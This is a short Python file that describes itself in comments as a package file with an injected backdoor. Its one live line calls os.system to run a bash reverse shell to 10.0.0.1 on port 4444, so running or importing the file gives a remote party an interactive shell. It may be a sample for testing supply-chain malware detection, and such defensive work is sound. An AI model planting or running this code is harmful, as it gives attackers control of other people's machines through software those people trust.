#!/usr/bin/env python3
# Modified package file containing injected backdoor
import os
import subprocess

# Injected reverse shell backdoor in package tree
os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
